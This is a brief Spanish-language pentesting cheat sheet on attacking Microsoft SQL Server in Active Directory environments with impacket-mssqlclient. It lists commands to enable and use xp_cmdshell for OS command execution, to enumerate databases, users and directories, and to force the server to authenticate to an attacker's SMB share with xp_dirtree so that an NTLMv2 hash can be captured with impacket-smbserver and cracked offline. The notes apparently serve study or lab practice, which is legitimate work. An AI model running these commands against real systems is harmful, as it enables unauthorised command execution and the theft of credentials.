# Microsoft SQL Server 

Tags: #AD #MSSQLServer #Windows 


```bash 
❯ impacket-mssqlclient domain/user:password@IP -windows-auth     # Conectarse a la DB

	# domain = Dominio del DC
	# windows-auth = Indicar que las credenciales son a nivel de autenticaión de Windows 


	❯ help                    # Panel de ayuda 
	❯ xp_cmdshell "whoami"    # Ejecutar un comando dentro de la DB
	❯ enable_xp_cmdshell      # Habilitar la funcionalidad para ejecutar comandos 
	❯ enum_db                 # Enumerar las DBs
	❯ enum_users              # Enumera los usuarios de la actual DB

	❯ xp_dirtree              # Enumera recursos SMB a nivel de red  
	❯ xp_dirtree C:\Users\    # Enumerar los recursos de los directorios en donde se tenga privilegios 
	❯ xp_dirtree C:\inetpub\wwwroot\    # Ruta raiz del servidor ISS
	❯ exit                    # Salir 


# Se puede interceptar un hash NTLMv2 e intentar crackear offline con 'Hashcat'
	❯ xp_dirtree \\IP\smbFolder\test     # Ejecutar desde la DB, colocando la dirección IP de Kali 

❯ impacket-smbserver smbFolder $(pwd) -smb2support    # Ejecutar en Kali para interceptar el hash
```